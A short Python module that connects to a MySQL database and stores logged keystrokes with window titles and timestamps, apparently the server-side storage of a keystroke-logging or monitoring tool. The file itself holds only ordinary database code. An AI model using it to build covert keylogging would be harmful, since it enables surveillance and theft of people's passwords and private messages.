import mysql.connector
from mysql.connector import Error
from config.server_config import host_db, user_db, password_db, database_db


def get_connection():
    return mysql.connector.connect(
        host=host_db,
        user=user_db,
        password=password_db,
        database=database_db
    )


def create_keystroke(key_data, window_title, view_id):
    try:
        conn = get_connection()
        cursor = conn.cursor()

        query = """
            INSERT INTO keystrokes (KeyData, WindowTitle, ViewID, LoggedAt)
            VALUES (%s, %s, %s, NOW())
        """

        cursor.execute(query, (key_data, window_title, view_id))
        conn.commit()
        return True

    except Exception as e:
        print("❌ DB Error:", e)
        return False

    finally:
        try:
            cursor.close()
            conn.close()
        except:
            pass
